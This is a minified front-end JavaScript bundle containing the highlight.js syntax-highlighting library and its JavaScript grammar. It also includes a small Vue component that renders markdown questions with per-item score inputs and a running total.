xe(e,{variants:null},t)})),e.cachedVariants?e.cachedVariants:bs(e)?xe(e,{starts:e.starts?xe(e.starts):null}):Object.isFrozen(e)?xe(e):e}var bi="11.11.1";class Ti extends Error{constructor(t,n){super(t),this.name="HTMLInjectionError",this.html=n}}const Bt=ws,xa=xe,ya=Symbol("nomatch"),Ci=7,Ts=function(e){const t=Object.create(null),n=Object.create(null),a=[];let s=!0;const r="Could not find the language '{}', did you forget to load/include a language module?",o={disableAutodetect:!0,name:"Plain text",contains:[]};let p={ignoreUnescapedHTML:!1,throwUnescapedHTML:!1,noHighlightRe:/^(no-?highlight)$/i,languageDetectRe:/\blang(?:uage)?-([\w-]+)\b/i,classPrefix:"hljs-",cssSelector:"pre code",languages:null,__emitter:Hl};function l(u){return p.noHighlightRe.test(u)}function i(u){let W=u.className+" ";W+=u.parentNode?u.parentNode.className:"";const T=p.languageDetectRe.exec(W);if(T){const E=F(T[1]);return E||(da(r.replace("{}",T[1])),da("Falling back to no-highlight mode for this block.",u)),E?T[1]:"no-highlight"}return W.split(/\s+/).find(E=>l(E)||F(E))}function d(u,W,T){let E="",D="";typeof W=="object"?(E=u,T=W.ignoreIllegals,D=W.language):(ve("10.7.0","highlight(lang, code, ...args) has been deprecated."),ve("10.7.0",`Please use highlight(code, options) instead.
https://github.com/highlightjs/highlight.js/issues/2277`),D=u,E=W),T===void 0&&(T=!0);const q={code:E,language:D};Ce("before:highlight",q);const ee=q.result?q.result:f(q.language,q.code,T);return ee.code=q.code,Ce("after:highlight",ee),ee}function f(u,W,T,E){const D=Object.create(null);function q(g,k){return g.keywords[k]}function ee(){if(!P.keywords){V.addText(L);return}let g=0;P.keywordPatternRe.lastIndex=0;let k=P.keywordPatternRe.exec(L),v="";for(;k;){v+=L.substring(g,k.index);const M=oe.case_insensitive?k[0].toLowerCase():k[0],z=q(P,M);if(z){const[ie,Ns]=z;if(V.addText(v),v="",D[M]=(D[M]||0)+1,D[M]<=Ci&&(tt+=Ns),ie.startsWith("_"))v+=k[0];else{const As=oe.classNameAliases[ie]||ie;re(k[0],As)}}else v+=k[0];g=P.keywordPatternRe.lastIndex,k=P.keywordPatternRe.exec(L)}v+=L.substring(g),V.addText(v)}function fe(){if(L==="")return;let g=null;if(typeof P.subLanguage=="string"){if(!t[P.subLanguage]){V.addText(L);return}g=f(P.subLanguage,L,!0,On[P.subLanguage]),On[P.subLanguage]=g._top}else g=h(L,P.subLanguage.length?P.subLanguage:null);P.relevance>0&&(tt+=g.relevance),V.__addSublanguage(g._emitter,g.language)}function Z(){P.subLanguage!=null?fe():ee(),L=""}function re(g,k){g!==""&&(V.startScope(k),V.addText(g),V.endScope())}function vn(g,k){let v=1;const M=k.length-1;for(;v<=M;){if(!g._emit[v]){v++;continue}const z=oe.classNameAliases[g[v]]||g[v],ie=k[v];z?re(ie,z):(L=ie,ee(),L=""),v++}}function Rn(g,k){return g.scope&&typeof g.scope=="string"&&V.openNode(oe.classNameAliases[g.scope]||g.scope),g.beginScope&&(g.beginScope._wrap?(re(L,oe.classNameAliases[g.beginScope._wrap]||g.beginScope._wrap),L=""):g.beginScope._multi&&(vn(g.beginScope,k),L="")),P=Object.create(g,{parent:{value:P}}),P}function En(g,k,v){let M=Jl(g.endRe,v);if(M){if(g["on:end"]){const z=new pa(g);g["on:end"](k,z),z.isMatchIgnored&&(M=!1)}if(M){for(;g.endsParent&&g.parent;)g=g.parent;return g}}if(g.endsWithParent)return En(g.parent,k,v)}function Rs(g){return P.matcher.regexIndex===0?(L+=g[0],1):(At=!0,0)}function Es(g){const k=g[0],v=g.rule,M=new pa(v),z=[v.__beforeBegin,v["on:begin"]];for(const ie of z)if(ie&&(ie(g,M),M.isMatchIgnored))return Rs(k);return v.skip?L+=k:(v.excludeBegin&&(L+=k),Z(),!v.returnBegin&&!v.excludeBegin&&(L=k)),Rn(v,g),v.returnBegin?0:k.length}function Ms(g){const k=g[0],v=W.substring(g.index),M=En(P,g,v);if(!M)return ya;const z=P;P.endScope&&P.endScope._wrap?(Z(),re(k,P.endScope._wrap)):P.endScope&&P.endScope._multi?(Z(),vn(P.endScope,g)):z.skip?L+=k:(z.returnEnd||z.excludeEnd||(L+=k),Z(),z.excludeEnd&&(L=k));do P.scope&&V.closeNode(),!P.skip&&!P.subLanguage&&(tt+=P.relevance),P=P.parent;while(P!==M.parent);return M.starts&&Rn(M.starts,g),z.returnEnd?0:k.length}function Os(){const g=[];for(let k=P;k!==oe;k=k.parent)k.scope&&g.unshift(k.scope);g.forEach(k=>V.openNode(k))}let et={};function Mn(g,k){const v=k&&k[0];if(L+=g,v==null)return Z(),0;if(et.type==="begin"&&k.type==="end"&&et.index===k.index&&v===""){if(L+=W.slice(k.index,k.index+1),!s){const M=new Error(`0 width match regex (${u})`);throw M.languageName=u,M.badRule=et.rule,M}return 1}if(et=k,k.type==="begin")return Es(k);if(k.type==="illegal"&&!T){const M=new Error('Illegal lexeme "'+v+'" for mode "'+(P.scope||"<unnamed>")+'"');throw M.mode=P,M}else if(k.type==="end"){const M=Ms(k);if(M!==ya)return M}if(k.type==="illegal"&&v==="")return L+=`
`,1;if(Nt>1e5&&Nt>k.index*3)throw new Error("potential infinite loop, way more iterations than matches");return L+=v,v.length}const oe=F(u);if(!oe)throw me(r.replace("{}",u)),new Error('Unknown language: "'+u+'"');const _s=Wi(oe);let _t="",P=E||_s;const On={},V=new p.__emitter(p);Os();let L="",tt=0,ue=0,Nt=0,At=!1;try{if(oe.__emitTokens)oe.__emitTokens(W,V);else{for(P.matcher.considerAll();;){Nt++,At?At=!1:P.matcher.considerAll(),P.matcher.lastIndex=ue;const g=P.matcher.exec(W);if(!g)break;const k=W.substring(ue,g.index),v=Mn(k,g);ue=g.index+v}Mn(W.substring(ue))}return V.finalize(),_t=V.toHTML(),{language:u,value:_t,relevance:tt,illegal:!1,_emitter:V,_top:P}}catch(g){if(g.message&&g.message.includes("Illegal"))return{language:u,value:Bt(W),illegal:!0,relevance:0,_illegalBy:{message:g.message,index:ue,context:W.slice(ue-100,ue+100),mode:g.mode,resultSoFar:_t},_emitter:V};if(s)return{language:u,value:Bt(W),illegal:!1,relevance:0,errorRaised:g,_emitter:V,_top:P};throw g}}function y(u){const W={value:Bt(u),illegal:!1,relevance:0,_top:o,_emitter:new p.__emitter(p)};return W._emitter.addText(u),W}function h(u,W){W=W||p.languages||Object.keys(t);const T=y(u),E=W.filter(F).filter(Ze).map(Z=>f(Z,u,!1));E.unshift(T);const D=E.sort((Z,re)=>{if(Z.relevance!==re.relevance)return re.relevance-Z.relevance;if(Z.language&&re.language){if(F(Z.language).supersetOf===re.language)return 1;if(F(re.language).supersetOf===Z.language)return-1}return 0}),[q,ee]=D,fe=q;return fe.secondBest=ee,fe}function m(u,W,T){const E=W&&n[W]||T;u.classList.add("hljs"),u.classList.add(`language-${E}`)}function b(u){let W=null;const T=i(u);if(l(T))return;if(Ce("before:highlightElement",{el:u,language:T}),u.dataset.highlighted){console.log("Element previously highlighted. To highlight again, first unset `dataset.highlighted`.",u);return}if(u.children.length>0&&(p.ignoreUnescapedHTML||(console.warn("One of your code blocks includes unescaped HTML. This is a potentially serious security risk."),console.warn("https://github.com/highlightjs/highlight.js/wiki/security"),console.warn("The element with unescaped HTML:"),console.warn(u)),p.throwUnescapedHTML))throw new Ti("One of your code blocks includes unescaped HTML.",u.innerHTML);W=u;const E=W.textContent,D=T?d(E,{language:T,ignoreIllegals:!0}):h(E);u.innerHTML=D.value,u.dataset.highlighted="yes",m(u,T,D.language),u.result={language:D.language,re:D.relevance,relevance:D.relevance},D.secondBest&&(u.secondBest={language:D.secondBest.language,relevance:D.secondBest.relevance}),Ce("after:highlightElement",{el:u,result:D,text:E})}function j(u){p=xa(p,u)}const le=()=>{K(),ve("10.6.0","initHighlighting() deprecated.  Use highlightAll() now.")};function Y(){K(),ve("10.6.0","initHighlightingOnLoad() deprecated.  Use highlightAll() now.")}let se=!1;function K(){function u(){K()}if(document.readyState==="loading"){se||window.addEventListener("DOMContentLoaded",u,!1),se=!0;return}document.querySelectorAll(p.cssSelector).forEach(b)}function Q(u,W){let T=null;try{T=W(e)}catch(E){if(me("Language definition for '{}' could not be registered.".replace("{}",u)),s)me(E);else throw E;T=o}T.name||(T.name=u),t[u]=T,T.rawDefinition=W.bind(null,e),T.aliases&&Qe(T.aliases,{languageName:u})}function B(u){delete t[u];for(const W of Object.keys(n))n[W]===u&&delete n[W]}function we(){return Object.keys(t)}function F(u){return u=(u||"").toLowerCase(),t[u]||t[n[u]]}function Qe(u,{languageName:W}){typeof u=="string"&&(u=[u]),u.forEach(T=>{n[T.toLowerCase()]=W})}function Ze(u){const W=F(u);return W&&!W.disableAutodetect}function Rt(u){u["before:highlightBlock"]&&!u["before:highlightElement"]&&(u["before:highlightElement"]=W=>{u["before:highlightBlock"](Object.assign({block:W.el},W))}),u["after:highlightBlock"]&&!u["after:highlightElement"]&&(u["after:highlightElement"]=W=>{u["after:highlightBlock"](Object.assign({block:W.el},W))})}function Et(u){Rt(u),a.push(u)}function Mt(u){const W=a.indexOf(u);W!==-1&&a.splice(W,1)}function Ce(u,W){const T=u;a.forEach(function(E){E[T]&&E[T](W)})}function Ot(u){return ve("10.7.0","highlightBlock will be removed entirely in v12.0"),ve("10.7.0","Please use highlightElement now."),b(u)}Object.assign(e,{highlight:d,highlightAuto:h,highlightAll:K,highlightElement:b,highlightBlock:Ot,configure:j,initHighlighting:le,initHighlightingOnLoad:Y,registerLanguage:Q,unregisterLanguage:B,listLanguages:we,getLanguage:F,registerAliases:Qe,autoDetection:Ze,inherit:xa,addPlugin:Et,removePlugin:Mt}),e.debugMode=function(){s=!1},e.safeMode=function(){s=!0},e.versionString=bi,e.regex={concat:Te,lookahead:fs,either:Tn,optional:jl,anyNumberOfTimes:Il};for(const u in rt)typeof rt[u]=="object"&&ys(rt[u]);return Object.assign(e,rt),e},Oe=Ts({});Oe.newInstance=()=>Ts({});var Pi=Oe;Oe.HighlightJS=Oe;Oe.default=Oe;const Ft=Na(Pi),wa="[A-Za-z$_][0-9A-Za-z$_]*",vi=["as","in","of","if","for","while","finally","var","new","function","do","return","void","else","break","catch","instanceof","with","throw","case","default","try","switch","continue","typeof","delete","let","yield","const","class","debugger","async","await","static","import","from","export","extends","using"],Ri=["true","false","null","undefined","NaN","Infinity"],Cs=["Object","Function","Boolean","Symbol","Math","Date","Number","BigInt","String","RegExp","Array","Float32Array","Float64Array","Int8Array","Uint8Array","Uint8ClampedArray","Int16Array","Int32Array","Uint16Array","Uint32Array","BigInt64Array","BigUint64Array","Set","Map","WeakSet","WeakMap","ArrayBuffer","SharedArrayBuffer","Atomics","DataView","JSON","Promise","Generator","GeneratorFunction","AsyncFunction","Reflect","Proxy","Intl","WebAssembly"],Ps=["Error","EvalError","InternalError","RangeError","ReferenceError","SyntaxError","TypeError","URIError"],vs=["setInterval","setTimeout","clearInterval","clearTimeout","require","exports","eval","isFinite","isNaN","parseFloat","parseInt","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","unescape"],Ei=["arguments","this","super","console","window","document","localStorage","sessionStorage","module","global"],Mi=[].concat(vs,Cs,Ps);function Oi(e){const t=e.regex,n=(T,{after:E})=>{const D="</"+T[0].slice(1);return T.input.indexOf(D,E)!==-1},a=wa,s={begin:"<>",end:"</>"},r=/<[A-Za-z0-9\\._:-]+\s*\/>/,o={begin:/<[A-Za-z0-9\\._:-]+/,end:/\/[A-Za-z0-9\\._:-]+>|\/>/,isTrulyOpeningTag:(T,E)=>{const D=T[0].length+T.index,q=T.input[D];if(q==="<"||q===","){E.ignoreMatch();return}q===">"&&(n(T,{after:D})||E.ignoreMatch());let ee;const fe=T.input.substring(D);if(ee=fe.match(/^\s*=/)){E.ignoreMatch();return}if((ee=fe.match(/^\s+extends\s+/))&&ee.index===0){E.ignoreMatch();return}}},p={$pattern:wa,keyword:vi,literal:Ri,built_in:Mi,"variable.language":Ei},l="[0-9](_?[0-9])*",i=`\\.(${l})`,d="0|[1-9](_?[0-9])*|0[0-7]*[89][0-9]*",f={className:"number",variants:[{begin:`(\\b(${d})((${i})|\\.)?|(${i}))[eE][+-]?(${l})\\b`},{begin:`\\b(${d})\\b((${i})\\b|\\.)?|(${i})\\b`},{begin:"\\b(0|[1-9](_?[0-9])*)n\\b"},{begin:"\\b0[xX][0-9a-fA-F](_?[0-9a-fA-F])*n?\\b"},{begin:"\\b0[bB][0-1](_?[0-1])*n?\\b"},{begin:"\\b0[oO][0-7](_?[0-7])*n?\\b"},{begin:"\\b0[0-7]+n?\\b"}],relevance:0},y={className:"subst",begin:"\\$\\{",end:"\\}",keywords:p,contains:[]},h={begin:".?html`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"xml"}},m={begin:".?css`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"css"}},b={begin:".?gql`",end:"",starts:{end:"`",returnEnd:!1,contains:[e.BACKSLASH_ESCAPE,y],subLanguage:"graphql"}},j={className:"string",begin:"`",end:"`",contains:[e.BACKSLASH_ESCAPE,y]},Y={className:"comment",variants:[e.COMMENT(/\/\*\*(?!\/)/,"\\*/",{relevance:0,contains:[{begin:"(?=@[A-Za-z]+)",relevance:0,contains:[{className:"doctag",begin:"@[A-Za-z]+"},{className:"type",begin:"\\{",end:"\\}",excludeEnd:!0,excludeBegin:!0,relevance:0},{className:"variable",begin:a+"(?=\\s*(-)|$)",endsParent:!0,relevance:0},{begin:/(?=[^\n])\s/,relevance:0}]}]}),e.C_BLOCK_COMMENT_MODE,e.C_LINE_COMMENT_MODE]},se=[e.APOS_STRING_MODE,e.QUOTE_STRING_MODE,h,m,b,j,{match:/\$\d+/},f];y.contains=se.concat({begin:/\{/,end:/\}/,keywords:p,contains:["self"].concat(se)});const K=[].concat(Y,y.contains),Q=K.concat([{begin:/(\s*)\(/,end:/\)/,keywords:p,contains:["self"].concat(K)}]),B={className:"params",begin:/(\s*)\(/,end:/\)/,excludeBegin:!0,excludeEnd:!0,keywords:p,contains:Q},we={variants:[{match:[/class/,/\s+/,a,/\s+/,/extends/,/\s+/,t.concat(a,"(",t.concat(/\./,a),")*")],scope:{1:"keyword",3:"title.class",5:"keyword",7:"title.class.inherited"}},{match:[/class/,/\s+/,a],scope:{1:"keyword",3:"title.class"}}]},F={relevance:0,match:t.either(/\bJSON/,/\b[A-Z][a-z]+([A-Z][a-z]*|\d)*/,/\b[A-Z]{2,}([A-Z][a-z]+|\d)+([A-Z][a-z]*)*/,/\b[A-Z]{2,}[a-z]+([A-Z][a-z]+|\d)*([A-Z][a-z]*)*/),className:"title.class",keywords:{_:[...Cs,...Ps]}},Qe={label:"use_strict",className:"meta",relevance:10,begin:/^\s*['"]use (strict|asm)['"]/},Ze={variants:[{match:[/function/,/\s+/,a,/(?=\s*\()/]},{match:[/function/,/\s*(?=\()/]}],className:{1:"keyword",3:"title.function"},label:"func.def",contains:[B],illegal:/%/},Rt={relevance:0,match:/\b[A-Z][A-Z_0-9]+\b/,className:"variable.constant"};function Et(T){return t.concat("(?!",T.join("|"),")")}const Mt={match:t.concat(/\b/,Et([...vs,"super","import"].map(T=>`${T}\\s*\\(`)),a,t.lookahead(/\s*\(/)),className:"title.function",relevance:0},Ce={begin:t.concat(/\./,t.lookahead(t.concat(a,/(?![0-9A-Za-z$_(])/))),end:a,excludeBegin:!0,keywords:"prototype",className:"property",relevance:0},Ot={match:[/get|set/,/\s+/,a,/(?=\()/],className:{1:"keyword",3:"title.function"},contains:[{begin:/\(\)/},B]},u="(\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)|"+e.UNDERSCORE_IDENT_RE+")\\s*=>",W={match:[/const|var|let/,/\s+/,a,/\s*/,/=\s*/,/(async\s*)?/,t.lookahead(u)],keywords:"async",className:{1:"keyword",3:"title.function"},contains:[B]};return{name:"JavaScript",aliases:["js","jsx","mjs","cjs"],keywords:p,exports:{PARAMS_CONTAINS:Q,CLASS_REFERENCE:F},illegal:/#(?![$_A-z])/,contains:[e.SHEBANG({label:"shebang",binary:"node",relevance:5}),Qe,e.APOS_STRING_MODE,e.QUOTE_STRING_MODE,h,m,b,j,Y,{match:/\$\d+/},f,F,{scope:"attr",match:a+t.lookahead(":"),relevance:0},W,{begin:"("+e.RE_STARTERS_RE+"|\\b(case|return|throw)\\b)\\s*",keywords:"return throw case",relevance:0,contains:[Y,e.REGEXP_MODE,{className:"function",begin:u,returnBegin:!0,end:"\\s*=>",contains:[{className:"params",variants:[{begin:e.UNDERSCORE_IDENT_RE,relevance:0},{className:null,begin:/\(\s*\)/,skip:!0},{begin:/(\s*)\(/,end:/\)/,excludeBegin:!0,excludeEnd:!0,keywords:p,contains:Q}]}]},{begin:/,/,relevance:0},{match:/\s+/,relevance:0},{variants:[{begin:s.begin,end:s.end},{match:r},{begin:o.begin,"on:begin":o.isTrulyOpeningTag,end:o.end}],subLanguage:"xml",contains:[{begin:o.begin,end:o.end,skip:!0,contains:["self"]}]}]},Ze,{beginKeywords:"while if switch catch for"},{begin:"\\b(?!function)"+e.UNDERSCORE_IDENT_RE+"\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)\\s*\\{",returnBegin:!0,label:"func.def",contains:[B,e.inherit(e.TITLE_MODE,{begin:a,className:"title.function"})]},{match:/\.\.\./,relevance:0},Ce,{match:"\\$"+a,relevance:0},{match:[/\bconstructor(?=\s*\()/],className:{1:"title.function"},contains:[B]},Mt,Rt,we,Ot,{match:/\$[(.]/}]}}const Di={name:"componentMarkdown",props:{data:{type:Array}},setup(e){const t=_n([...e.data]),n=_n(0),a=new cs;Ft.registerLanguage("javascript",Oi);const s=(r,o)=>{Number(r.target.value||0)>o.score&&(r.target.value=o.scoring||""),o.scoring=Number(r.target.value||0)};return a.use(Ml({langPrefix:"hljs language-",gfm:!0,tables:!1,breaks:!0,pedantic:!0,highlight(r,o){const p=Ft.getLanguage(o)?o:"javascript";return Ft.highlight(r,{language:p}).value}})),Hs(()=>t,r=>{var p;let o=0;(p=r.value)==null||p.forEach(l=>{o=o+(l.scoring||0)}),n.value=o},{deep:!0}),()=>{var o;if(!e.data||!((o=e.data)!=null&&o.length))return X("div",[X("span","暂无数据")]);const r=t.value.map(p=>{const l=a.parse(p.text);return X("div",{class:"main-box_inner"},[X("div",{class:"inner-head"},[X("h4",{class:"head-title"},p.title),X("div",{class:"head-re"},[X("span",{class:"head-score"},`${p.score} 分`),X("input",{class:"head-statistics",type:"number",step:1,onInput:i=>s(i,p)})])]),/<details.*?>/i.test(l)?X("div",{class:"inner-content ",innerHTML:l}):X("details",{class:"inner-content ",innerHTML:l})])});return X("div",{class:"main-box"},[...r,X("div",{class:"content-scoring"},[X("span",{},"总得分："),X("span",{class:"scoring-num"},n.value)])])}}};export{Di as _,Li as g,Ai as s};
